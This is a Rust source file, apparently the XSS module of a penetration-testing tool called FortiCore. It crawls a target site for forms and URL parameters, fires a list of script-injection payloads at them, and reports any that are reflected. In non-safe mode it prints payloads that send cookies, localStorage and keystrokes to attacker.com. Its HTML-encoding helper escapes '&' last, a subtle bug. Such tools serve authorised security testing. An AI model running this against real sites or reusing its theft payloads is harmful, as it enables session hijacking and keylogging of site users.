use crate::exploits::{add_exploit_result, ExploitResult};
use crate::scanners::{Severity, Vulnerability};
use crate::utils::{error::FortiCoreResult, FortiCoreError};
use colored::*;
use regex::Regex;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT};
use reqwest::{Client, Response};
use serde_json::json;
use std::collections::HashMap;
use tokio::time::{sleep, Duration};
use url::Url;

// List of XSS vectors to test
const XSS_PAYLOADS: &[&str] = &[
    "<script>alert('FortiCore-XSS')</script>",
    "<img src=x onerror=alert('FortiCore-XSS')>",
    "<svg onload=alert('FortiCore-XSS')>",
    "\"><script>alert('FortiCore-XSS')</script>",
    "';alert('FortiCore-XSS');//",
    "<iframe src=\"javascript:alert('FortiCore-XSS')\"></iframe>",
    "<body onload=alert('FortiCore-XSS')>",
    "<a href=\"javascript:alert('FortiCore-XSS')\">Click me</a>",
    "<div style=\"background-image: url(javascript:alert('FortiCore-XSS'))\"></div>",
];

// Type of XSS found
#[derive(Debug)]
enum XssType {
    Reflected,
    Stored,
    DOM,
}

// Structure to track XSS vulnerabilities
struct XssVulnerability {
    param_name: String,
    payload: String,
    injection_point: String,
    xss_type: XssType,
    evidence: String,
}

pub async fn exploit(target: &str, safe_mode: bool, verbose: bool) -> FortiCoreResult<()> {
    println!("{}", "Starting XSS exploitation module...".bright_yellow());

    if !safe_mode {
        println!(
            "{}",
            "Warning: Safe mode is disabled. Running full XSS exploits.".bright_red()
        );
    }

    // Normalize URL
    let target_url = normalize_url(target);
    let parsed_url = Url::parse(&target_url)
        .map_err(|e| FortiCoreError::InputError(format!("Invalid URL format: {}", e)))?;

    if verbose {
        println!("Targeting URL: {}", target_url);
    }

    // Create vulnerability object
    let vuln = Vulnerability {
        id: "WEB-001".to_string(),
        name: "Cross-Site Scripting (XSS)".to_string(),
        description: "Application is vulnerable to Cross-Site Scripting (XSS), allowing attackers to inject malicious client-side scripts".to_string(),
        severity: Severity::High,
        location: target_url.clone(),
        exploitable: true,
        details: json!({}),
    };

    // Create HTTP client with appropriate headers
    let client = create_client()?;

    // First, crawl the target to identify forms and input points
    println!(
        "{}",
        "Phase 1: Crawling target for injection points...".bright_blue()
    );

    let crawl_result = find_injection_points(&client, &target_url, verbose).await;
    let (forms, parameters) = match crawl_result {
        Ok((forms, params)) => (forms, params),
        Err(e) => {
            // Record failed exploit
            add_exploit_result(ExploitResult::Failed {
                vulnerability: vuln.clone(),
                reason: format!("Failed to crawl target: {}", e),
            });
            return Err(e);
        }
    };

    if forms.is_empty() && parameters.is_empty() {
        println!("{}", "No suitable injection points found.".bright_yellow());

        // Record partial exploit
        add_exploit_result(ExploitResult::Partial {
            vulnerability: vuln,
            details: json!({
                "forms_found": 0,
                "parameters_found": 0,
                "xss_found": false
            }),
            reason: "No suitable injection points found".to_string(),
        });

        return Ok(());
    }

    println!("{}", "Phase 2: Testing XSS vectors...".bright_blue());

    // Store discovered vulnerabilities
    let mut vulnerabilities = Vec::new();

    // Test URL parameters for GET-based XSS
    for param in &parameters {
        for payload in XSS_PAYLOADS {
            if verbose {
                println!("Testing parameter '{}' with payload: {}", param, payload);
            }

            let result =
                test_get_parameter_xss(&client, &parsed_url, param, payload, verbose).await?;
            if let Some(evidence) = result {
                println!(
                    "{}",
                    format!("XSS vulnerability found in parameter: {}", param).bright_red()
                );

                vulnerabilities.push(XssVulnerability {
                    param_name: param.to_string(),
                    payload: payload.to_string(),
                    injection_point: "URL Parameter".to_string(),
                    xss_type: XssType::Reflected,
                    evidence: evidence.to_string(),
                });

                // If in safe mode, just report the first vulnerability per parameter
                if safe_mode {
                    break;
                }
            }

            // Slight delay to avoid flooding the server
            sleep(Duration::from_millis(300)).await;
        }
    }

    // Test forms for POST-based XSS
    for (i, form) in forms.iter().enumerate() {
        println!("Testing form #{} at: {}", i + 1, form.action);

        for (field_name, field_type) in &form.fields {
            // Only test text-like fields
            if !is_text_field(field_type) {
                continue;
            }

            for payload in XSS_PAYLOADS {
                if verbose {
                    println!(
                        "Testing form field '{}' with payload: {}",
                        field_name, payload
                    );
                }

                let result =
                    test_post_form_xss(&client, form, field_name, payload, verbose).await?;
                if let Some(evidence) = result {
                    println!(
                        "{}",
                        format!("XSS vulnerability found in form field: {}", field_name)
                            .bright_red()
                    );

                    vulnerabilities.push(XssVulnerability {
                        param_name: field_name.to_string(),
                        payload: payload.to_string(),
                        injection_point: format!("Form #{}", i + 1),
                        xss_type: XssType::Reflected,
                        evidence: evidence.to_string(),
                    });

                    // If in safe mode, just report the first vulnerability per field
                    if safe_mode {
                        break;
                    }
                }

                // Slight delay to avoid flooding the server
                sleep(Duration::from_millis(300)).await;
            }
        }
    }

    // Phase 3: Report findings
    println!("{}", "Phase 3: Exploitation results".bright_blue());
    if vulnerabilities.is_empty() {
        println!("{}", "No XSS vulnerabilities were found.".bright_green());

        // Record failed exploit
        add_exploit_result(ExploitResult::Failed {
            vulnerability: vuln,
            reason: "No XSS vulnerabilities were found".to_string(),
        });
    } else {
        println!(
            "{}",
            format!("Found {} XSS vulnerabilities:", vulnerabilities.len()).bright_red()
        );

        // Collect details for all vulnerabilities
        let mut all_details = Vec::new();

        for (i, vuln_info) in vulnerabilities.iter().enumerate() {
            println!("\n{}", format!("Vulnerability #{}", i + 1).bright_yellow());
            println!(
                "Location: {} ({})",
                vuln_info.injection_point, vuln_info.param_name
            );
            println!("Type: {:?} XSS", vuln_info.xss_type);
            println!("Payload: {}", vuln_info.payload);

            // Display evidence snippet, but not the whole response
            let evidence_preview = if vuln_info.evidence.len() > 150 {
                format!("{}...", &vuln_info.evidence[0..150])
            } else {
                vuln_info.evidence.clone()
            };
            println!("Evidence: {}", evidence_preview);

            // Add to details collection
            all_details.push(json!({
                "parameter": vuln_info.param_name,
                "injection_point": vuln_info.injection_point,
                "type": format!("{:?}", vuln_info.xss_type),
                "payload": vuln_info.payload,
                "evidence": evidence_preview
            }));

            // Demonstrate impact (simulated)
            println!("{}", "Potential impact:".bright_red());
            match vuln_info.xss_type {
                XssType::Reflected => {
                    println!("- Cookie theft / session hijacking");
                    println!("- Phishing through page content manipulation");
                    println!("- Browser-based attacks through malicious scripts");
                }
                XssType::Stored => {
                    println!("- Persistent attacks affecting multiple users");
                    println!("- Website defacement");
                    println!("- Malware distribution");
                }
                XssType::DOM => {
                    println!("- Client-side data manipulation");
                    println!("- DOM-based cookie theft");
                }
            }

            if !safe_mode {
                println!("{}", "Advanced exploitation (non-safe mode):".bright_red());
                println!("- Cookie exfiltration payload: <script>fetch('https://attacker.com/c='+document.cookie)</script>");
                println!("- Local storage theft: <script>fetch('https://attacker.com/data='+JSON.stringify(localStorage))</script>");
                println!("- Keylogger injection: <script>document.addEventListener('keypress',function(e){{fetch('https://attacker.com/key='+e.key)}});</script>");
            }
        }

        // If we found vulnerabilities, provide mitigation guidance
        println!("\n{}", "Remediation recommendations:".bright_yellow());
        println!(
            "1. Implement output encoding appropriate to the context (HTML, JavaScript, CSS, URL)"
        );
        println!("2. Validate and sanitize all user input before processing");
        println!("3. Implement Content Security Policy (CSP) headers");
        println!("4. Use frameworks that automatically escape output");
        println!("5. Consider using the HTTPOnly flag for sensitive cookies");
        println!("6. Use X-XSS-Protection header for older browsers");

        // Record successful exploit
        add_exploit_result(ExploitResult::Success {
            vulnerability: vuln.clone(),
            details: json!({
                "forms_tested": forms.len(),
                "parameters_tested": parameters.len(),
                "vulnerabilities_found": vulnerabilities.len(),
                "xss_details": all_details
            }),
        });
    }

    Ok(())
}

// Define a structure to represent HTML forms
struct HtmlForm {
    action: String,
    method: String,
    fields: Vec<(String, String)>,         // (name, type)
    other_inputs: HashMap<String, String>, // hidden fields etc.
}

// Find forms and parameters for injection
async fn find_injection_points(
    client: &Client,
    url: &str,
    verbose: bool,
) -> FortiCoreResult<(Vec<HtmlForm>, Vec<String>)> {
    if verbose {
        println!("Scanning for injection points at: {}", url);
    }

    // Get the main page content
    let resp = client.get(url).send().await.map_err(|e| {
        FortiCoreError::NetworkError(format!("Failed to connect to {}: {}", url, e))
    })?;

    let body = resp
        .text()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed to read response: {}", e)))?;

    // Extract forms
    let forms = extract_forms(&body, url);
    if verbose {
        println!("Found {} forms", forms.len());
        for (i, form) in forms.iter().enumerate() {
            println!(
                "Form #{}: Action={}, Method={}, Fields={}",
                i + 1,
                form.action,
                form.method,
                form.fields.len()
            );
        }
    }

    // Extract URL parameters from the query string
    let parsed_url = Url::parse(url).unwrap(); // Safe because we normalized it earlier
    let parameters = parsed_url
        .query_pairs()
        .map(|(key, _)| key.to_string())
        .collect::<Vec<String>>();

    if verbose && !parameters.is_empty() {
        println!(
            "Found {} URL parameters: {:?}",
            parameters.len(),
            parameters
        );
    }

    Ok((forms, parameters))
}

// Extract forms from HTML content
fn extract_forms(html: &str, base_url: &str) -> Vec<HtmlForm> {
    let mut forms = Vec::new();

    // Extract forms using regex
    let form_regex = Regex::new(r"<form[^>]*>(.*?)</form>").unwrap();
    let form_attrs_regex = Regex::new(r#"<form\s+([^>]*)>"#).unwrap();
    let action_regex = Regex::new(r#"action=["']([^"']*)["']"#).unwrap();
    let method_regex = Regex::new(r#"method=["']([^"']*)["']"#).unwrap();
    let input_regex = Regex::new(r#"<input\s+([^>]*)>"#).unwrap();
    let name_regex = Regex::new(r#"name=["']([^"']*)["']"#).unwrap();
    let type_regex = Regex::new(r#"type=["']([^"']*)["']"#).unwrap();
    let value_regex = Regex::new(r#"value=["']([^"']*)["']"#).unwrap();

    for form_match in form_regex.captures_iter(html) {
        let form_html = &form_match[0];

        // Get form attributes
        let mut action = String::new();
        let mut method = "get".to_string(); // Default to GET

        if let Some(attrs_match) = form_attrs_regex.captures(form_html) {
            let attrs = &attrs_match[1];

            if let Some(action_match) = action_regex.captures(attrs) {
                action = action_match[1].to_string();
            }

            if let Some(method_match) = method_regex.captures(attrs) {
                method = method_match[1].to_lowercase();
            }
        }

        // Resolve relative URL
        if !action.starts_with("http") {
            if action.starts_with("/") {
                let base = Url::parse(base_url).unwrap();
                action = format!(
                    "{}://{}{}",
                    base.scheme(),
                    base.host_str().unwrap_or(""),
                    action
                );
            } else if action.is_empty() {
                action = base_url.to_string();
            } else {
                // Assume action is relative to the current page
                if base_url.ends_with("/") {
                    action = format!("{}{}", base_url, action);
                } else {
                    action = format!("{}/{}", base_url, action);
                }
            }
        }

        // Extract input fields
        let mut fields = Vec::new();
        let mut other_inputs = HashMap::new();

        for input_match in input_regex.captures_iter(form_html) {
            let input_attrs = &input_match[1];

            let mut name = String::new();
            let mut input_type = "text".to_string(); // Default to text
            let mut value = String::new();

            if let Some(name_match) = name_regex.captures(input_attrs) {
                name = name_match[1].to_string();
            }

            if let Some(type_match) = type_regex.captures(input_attrs) {
                input_type = type_match[1].to_lowercase();
            }

            if let Some(value_match) = value_regex.captures(input_attrs) {
                value = value_match[1].to_string();
            }

            // Skip inputs without a name
            if name.is_empty() {
                continue;
            }

            // Standard visible inputs go to fields
            if is_text_field(&input_type) {
                fields.push((name, input_type));
            } else {
                // Hidden fields and others go to other_inputs
                other_inputs.insert(name, value);
            }
        }

        forms.push(HtmlForm {
            action,
            method,
            fields,
            other_inputs,
        });
    }

    forms
}

// Is this a text-like input field that could accept XSS payloads?
fn is_text_field(field_type: &str) -> bool {
    matches!(
        field_type,
        "text" | "search" | "url" | "tel" | "email" | "password" | "textarea" | ""
    )
}

// Test a GET parameter for XSS
async fn test_get_parameter_xss(
    client: &Client,
    base_url: &Url,
    param: &str,
    payload: &str,
    verbose: bool,
) -> FortiCoreResult<Option<String>> {
    // Create a new URL with the XSS payload in the parameter
    let mut url = base_url.clone();
    {
        let mut query_pairs = url.query_pairs_mut();
        query_pairs.clear();

        // Add original parameters from the base URL
        for (key, value) in base_url.query_pairs() {
            if key == param {
                query_pairs.append_pair(&key, payload);
            } else {
                query_pairs.append_pair(&key, &value);
            }
        }

        // If param wasn't in the original query, add it
        if !base_url.query_pairs().any(|(key, _)| key == param) {
            query_pairs.append_pair(param, payload);
        }
    }

    if verbose {
        println!("Testing URL: {}", url);
    }

    // Send the request
    let resp = client
        .get(url.as_str())
        .send()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed to connect: {}", e)))?;

    // Check the response for the payload
    check_xss_response(resp, payload).await
}

// Test a form field for XSS via POST
async fn test_post_form_xss(
    client: &Client,
    form: &HtmlForm,
    field_name: &str,
    payload: &str,
    verbose: bool,
) -> FortiCoreResult<Option<String>> {
    // Build form data
    let mut form_data = HashMap::new();

    // Add all hidden and other input fields
    for (key, value) in &form.other_inputs {
        form_data.insert(key.clone(), value.clone());
    }

    // Add our test field with the XSS payload
    form_data.insert(field_name.to_string(), payload.to_string());

    // Add other visible fields with dummy values
    for (name, _) in &form.fields {
        if name != field_name && !form_data.contains_key(name) {
            form_data.insert(name.clone(), "test123".to_string());
        }
    }

    if verbose {
        println!("Submitting to form action: {}", form.action);
        println!("With test payload in field: {}", field_name);
    }

    // Send request based on the form method
    let resp = if form.method == "post" {
        client
            .post(&form.action)
            .form(&form_data)
            .send()
            .await
            .map_err(|e| FortiCoreError::NetworkError(format!("Failed to submit form: {}", e)))?
    } else {
        // For GET methods, convert form data to query parameters
        let mut url = Url::parse(&form.action)
            .map_err(|e| FortiCoreError::InputError(format!("Invalid form action URL: {}", e)))?;

        {
            let mut query_pairs = url.query_pairs_mut();
            for (key, value) in &form_data {
                query_pairs.append_pair(key, value);
            }
        }

        client
            .get(url.as_str())
            .send()
            .await
            .map_err(|e| FortiCoreError::NetworkError(format!("Failed to submit form: {}", e)))?
    };

    // Check the response for the payload
    check_xss_response(resp, payload).await
}

// Check if the XSS payload was reflected in the response
async fn check_xss_response(resp: Response, payload: &str) -> FortiCoreResult<Option<String>> {
    // Get response body
    let body = resp
        .text()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed to read response: {}", e)))?;

    // Check if our payload is in the response
    if body.contains(payload) {
        // Find the context - extract the surrounding text
        let payload_index = body.find(payload).unwrap();
        let start = if payload_index > 50 {
            payload_index - 50
        } else {
            0
        };
        let end = std::cmp::min(payload_index + payload.len() + 50, body.len());

        let context = body[start..end].to_string();
        return Ok(Some(context));
    }

    // Check for encoded versions of the payload
    let html_encoded = html_encode(payload);
    if body.contains(&html_encoded) {
        // It's encoded, not directly vulnerable
        return Ok(None);
    }

    Ok(None)
}

// Simple HTML encoding for checking if the payload was encoded
fn html_encode(input: &str) -> String {
    input
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
        .replace('&', "&amp;")
}

fn normalize_url(url: &str) -> String {
    if !url.starts_with("http://") && !url.starts_with("https://") {
        format!("http://{}", url)
    } else {
        url.to_string()
    }
}

fn create_client() -> FortiCoreResult<Client> {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) FortiCore/0.1.0"),
    );

    let client = Client::builder()
        .default_headers(headers)
        .timeout(std::time::Duration::from_secs(15))
        .build()
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
        })?;

    Ok(client)
}
